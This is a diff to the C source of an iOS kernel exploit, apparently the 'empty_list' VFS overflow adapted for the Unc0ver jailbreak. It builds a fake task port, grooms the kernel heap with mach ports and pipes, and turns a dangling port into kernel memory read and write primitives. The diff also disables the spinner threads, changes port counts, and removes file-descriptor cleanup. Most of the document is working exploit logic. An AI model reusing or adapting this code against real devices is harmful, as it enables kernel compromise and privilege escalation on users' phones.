@@ -14,9 +14,14 @@
 #include "empty_list_sploit.h"
 #include "offsets.h"
 #include "kmem.h"
+#include "mx_common.h"
 
+// MAD props to Externalist for his cleanup and changes to the spinners and threads that improved this exploit.
+// I, GeoSn0w (@FCE365) added them to Unc0ver and patched things up but they were not my idea so the author should be credited
+// that is https://github.com/externalist/exploit_playground
+// DO NOT REMOVE THIS!
 
-static void increase_limits() {
+void increase_limits() {
   struct rlimit lim = {0};
   int err = getrlimit(RLIMIT_NOFILE, &lim);
   if (err != 0) {
@@ -47,7 +52,7 @@ static void increase_limits() {
 #define IKOT_TASK 2
 #define IKOT_NONE 0
 
-static void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, uint64_t initial_read_addr, uint64_t vm_map, uint64_t receiver, uint64_t context) {
+void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, uint64_t initial_read_addr, uint64_t vm_map, uint64_t receiver, uint64_t context) {
   // clear the region we'll use:
   memset(fake_port, 0, 0x500);
   
@@ -78,11 +83,11 @@ static void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, u
   // set the bsd_info pointer to be 0x10 bytes before the desired initial read:
   *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - 0x10;
 }
-
-static int message_size_for_kalloc_size(int kalloc_size) {
+/*
+int message_size_for_kalloc_size(int kalloc_size) {
   return ((3*kalloc_size)/4) - 0x74;
 }
-
+*/
 
 #define N_EARLY_PORTS 80000
 mach_port_t early_ports[N_EARLY_PORTS+20000];
@@ -303,7 +308,7 @@ void* attrBuf = NULL;
 void prepare_vfs_overflow() {
   vfs_fd = open("/", O_RDONLY);
   if (vfs_fd == -1) {
-    perror("unable to open fs root\n");
+    perror("Unable to open fs root\n");
     return;
   }
   
@@ -337,16 +342,18 @@ void* spinner(void* arg) {
   return NULL;
 }
 
-#define N_SPINNERS 25
+#define N_SPINNERS 100
 pthread_t spin_threads[N_SPINNERS];
 
 void start_spinners() {
+    return;
   for (int i = 0; i < N_SPINNERS; i++) {
     pthread_create(&spin_threads[i], NULL, spinner, NULL);
   }
 }
 
 void stop_spinners() {
+  return;
   keep_spinning = 0;
   for (int i = 0; i < N_SPINNERS; i++) {
     pthread_join(spin_threads[i], NULL);
@@ -378,7 +385,7 @@ static uint32_t early_rk32(uint64_t kaddr) {
   write(early_read_write_fd, buf, 0xfff);
   
   uint32_t val = 0;
-  kern_return_t err = pid_for_task(early_read_port, (int *)&val);
+  kern_return_t err = pid_for_task(early_read_port, &val);
   if (err != KERN_SUCCESS) {
     printf("pid_for_task returned %x (%s)\n", err, mach_error_string(err));
   }
@@ -440,9 +447,8 @@ void vfs_sploit() {
   mach_port_t kalloc_holder_port = MACH_PORT_NULL;
   
   
-  int kallocs_per_zcram = (int)kernel_page_size/0x10; // 0x1000 with small kernel pages, 0x4000 with large
-  int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0x61;  // 0x3000 with small kernel pages, 0x4000 with large
-  
+  int kallocs_per_zcram = kernel_page_size/0x10; // 0x1000 with small kernel pages, 0x4000 with large
+  int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0xe0;
   for (int i = 0; i < INITIAL_PATTERN_REPEATS; i++) {
     // 1 page of kalloc
     for (int i = 0; i < kallocs_per_zcram; i++) {
@@ -626,7 +632,8 @@ void vfs_sploit() {
   // if that worked we should now be able to find the address of the canary port:
   uint64_t canary_port_kaddr = 0;
   kern_return_t err;
-  err = mach_port_get_context(mach_task_self(), target_port, (mach_port_context_t *)&canary_port_kaddr);
+    
+  err = mach_port_get_context(mach_task_self(), target_port, &canary_port_kaddr);
   if (err != KERN_SUCCESS) {
     printf("error getting context from the target port (but no panic...): %s\n", mach_error_string(err));
   }
@@ -670,7 +677,7 @@ void vfs_sploit() {
     char pad[1000];
   } msg = {0};
   
-  printf("sizeof(msg) 0x%x\n", (unsigned int)sizeof(msg));
+  printf("sizeof(msg) 0x%x\n", sizeof(msg));
   
   int hit_dangler = 0;
   int dangler_hits = 0;
@@ -737,7 +744,7 @@ void vfs_sploit() {
         
         ssize_t amount_written = write(write_end, pipe_buf, 0xfff);
         if (amount_written != 0xfff) {
-          printf("amount written was short: 0x%x\n", (unsigned int)amount_written);
+          printf("amount written was short: 0x%x\n", amount_written);
         }
         
         read_ends[next_pipe_index] = read_end;
@@ -755,20 +762,20 @@ void vfs_sploit() {
   // check the kernel object type of the dangling port:
   int otype = 0;
   mach_vm_address_t oaddr = 0;
-  err = mach_port_kobject(mach_task_self(), target_port, (natural_t *)&otype, &oaddr);
+  err = mach_port_kobject(mach_task_self(), target_port, &otype, &oaddr);
   if (err != KERN_SUCCESS) {
     printf("mach_port_kobject failed: %x %s\n", err, mach_error_string(err));
   }
   printf("dangling port type: %x\n", otype);
   
   uint64_t replacer_pipe_index = 0xfffffff;
-  err = mach_port_get_context(mach_task_self(), target_port, (mach_port_context_t *)&replacer_pipe_index);
-  printf("got replaced with pipe fd index %d\n", (int)replacer_pipe_index);
+  err = mach_port_get_context(mach_task_self(), target_port, &replacer_pipe_index);
+  printf("got replaced with pipe fd index %d\n", replacer_pipe_index);
   
   printf("gonna try a read...\n");
   
   uint32_t val = 0;
-  err = pid_for_task(target_port, (int *)&val);
+  err = pid_for_task(target_port, &val);
   if (err != KERN_SUCCESS) {
     printf("pid_for_task returned %x (%s)\n", err, mach_error_string(err));
   }
@@ -797,7 +804,7 @@ void vfs_sploit() {
     
     // try the read, did it change?
     uint32_t val = 0;
-    err = pid_for_task(target_port, (int *)&val);
+    err = pid_for_task(target_port, &val);
     if (err != KERN_SUCCESS) {
       printf("pid_for_task returned %x (%s)\n", err, mach_error_string(err));
     }
@@ -1048,11 +1055,6 @@ void vfs_sploit() {
   wk64(pipe + 0x00, 0);
   wk64(pipe + 0x08, 0);
   wk64(pipe + 0x10, 0);
-    
-  for (int i = 0; i < total_fds; i++) {
-    close(read_ends[i]);
-    close(write_ends[i]);
-  }
 
   printf("done!\n");
   
